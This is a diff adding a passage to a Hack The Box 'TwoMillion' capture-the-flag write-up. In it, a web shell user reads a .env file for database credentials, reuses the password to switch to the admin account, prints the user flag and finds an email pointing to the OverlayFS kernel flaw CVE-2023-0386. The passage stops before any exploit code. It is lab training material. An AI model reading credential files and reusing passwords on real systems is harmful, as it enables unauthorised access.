@@ -178,3 +178,85 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@2million:~/html$ 
 ```
 
+Checking `.env` file
+
+```
+www-data@2million:~/html$ ls -la
+ls -la
+total 56
+drwxr-xr-x 10 root root 4096 Dec  1 10:40 .
+drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
+-rw-r--r--  1 root root   87 Jun  2  2023 .env
+-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
+-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
+drwxr-xr-x  5 root root 4096 Dec  1 10:40 VPN
+drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
+drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
+drwxr-xr-x  5 root root 4096 Jun  6  2023 css
+drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
+drwxr-xr-x  2 root root 4096 Jun  6  2023 images
+-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
+drwxr-xr-x  3 root root 4096 Jun  6  2023 js
+drwxr-xr-x  2 root root 4096 Jun  6  2023 views
+www-data@2million:~/html$ cat .env
+cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass---
+www-data@2million:~/html$ 
+```
+
+Found the password of `admin` user.
+
+```
+www-data@2million:~/html$ su admin    
+su admin
+Password: SuperDuperPass---
+id
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
+```
+
+# [CTUF]()
+
+Searching user flag file.
+
+```
+$ find / -name user.txt 2>/dev/null
+/home/admin/user.txt
+```
+
+Checking content of `/home/admin/user.txt`
+
+```
+$ cat /home/admin/user.txt
+f8404dc7c05dfa9a10c2e3ce6c557---
+```
+
+# [Enumeration of PrivEsc]()
+
+Checking email from the dir `/var/spool/mail`.
+
+```
+$ pwd
+/var/spool/mail
+
+$ cat admin
+From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather
+```
+
+Searching `OverlayFS / FUSE exploit` found [this](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) article explaining `CVE-2023-0386`
+
+
